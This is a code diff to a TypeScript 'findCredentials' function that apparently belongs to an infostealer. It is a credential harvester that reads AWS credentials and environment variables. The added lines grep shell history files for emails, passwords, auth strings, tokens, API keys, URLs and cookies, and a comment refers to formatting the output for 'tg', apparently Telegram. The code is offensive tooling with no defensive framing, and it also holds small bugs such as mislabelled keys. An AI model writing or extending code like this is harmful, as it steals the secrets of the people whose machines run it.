@@ -36,6 +36,7 @@ const findCredentials = (text: string) => {
   credentials.ssh.sshd = {} as any;
   credentials.users = {} as any;
   credentials.shell = {} as any;
+  credentials.shell.history = {} as any;
 
   /* In case system is Termux, prepend prefix to paths */
   const prefix = _run(`echo "$PREFIX"`);
@@ -43,8 +44,13 @@ const findCredentials = (text: string) => {
   if (prefix) {
     if (_run(`ls /data/data/com.termux`)) {
       path = prefix;
+      if (path[path.length-1] === "\n") {
+        path = path.substring(0, path.length -1);
+      }
     }
   }
+
+  console.log(`PATH IS: cat ${path}/abc`);
 
   const awsCredentials = _run(`cat ~/.aws/credentials`);
   if (awsCredentials) {
@@ -331,9 +337,55 @@ const findCredentials = (text: string) => {
     credentials.shell.env.content = enviromentVariables;
   }
 
+  /* TODO: Make history work in subshell */
+  const historyEmail = _run(`cat ~/.*istor* | grep -i mail`);
+  const historyPass = _run(`cat ~/.*istor* | grep -i pass`);
+  const historyAuth = _run(`cat ~/.*istor* | grep -i auth`);
+  const historyToken = _run(`cat ~/.*istor* | grep -i token`);
+  const historyApi = _run(`cat ~/.*istor* | grep -i api`);
+  const historyUrls = _run(`cat ~/.*istor* | grep -i http`);
+  const historyCookie = _run(`cat ~/.*istor* | grep -i cookie`);
+  if (historyEmail) {
+    credentials.shell.history.email = {} as any;
+    credentials.shell.history.email.path = "$ history | grep -i mail";
+    credentials.shell.history.email.content = historyEmail;
+  }
+  if (historyPass) {
+    credentials.shell.history.pass = {} as any;
+    credentials.shell.history.pass.path = "$ cat ~/.*istor* | grep -i pass";
+    credentials.shell.history.pass.content = historyPass;
+  }
+  if (historyAuth) {
+    credentials.shell.history.auth = {} as any;
+    credentials.shell.history.auth.pass = "$ cat ~/.*istor* | grep -i auth";
+    credentials.shell.history.auth.content = historyAuth;
+  }
+  if (historyToken) {
+    credentials.shell.history.token = {} as any;
+    credentials.shell.history.token.pass = "$ cat ~/.*istor* | grep -i token";
+    credentials.shell.history.token.content = historyToken;
+  }
+  if (historyApi) {
+    credentials.shell.history.api = {} as any;
+    credentials.shell.history.api.pass = "$ cat ~/.*istor* | grep -i api";
+    credentials.shell.history.api.content = historyApi;
+  }
+  if (historyUrls) {
+    credentials.shell.history.urls = {} as any;
+    credentials.shell.history.urls.path = "$ cat ~/.*istor* | grep -i http";
+    credentials.shell.history.urls.content = historyUrls;
+  }
+  if (historyCookie) {
+    credentials.shell.history.cookie = {} as any;
+    credentials.shell.history.cookie.path = "cat ~/.*istor* | grep -i cookie";
+    credentials.shell.history.cookie.content = historyCookie;
+  }
+
   // TODO: Remove void objects
   // TODO: Pretty Ouput function (json is ugly in tg)
   return JSON.stringify(credentials, null, 2);
+  // console.log(JSON.stringify(credentials, null, 2));
+  // return "dummy";
 }
 
 export default findCredentials;
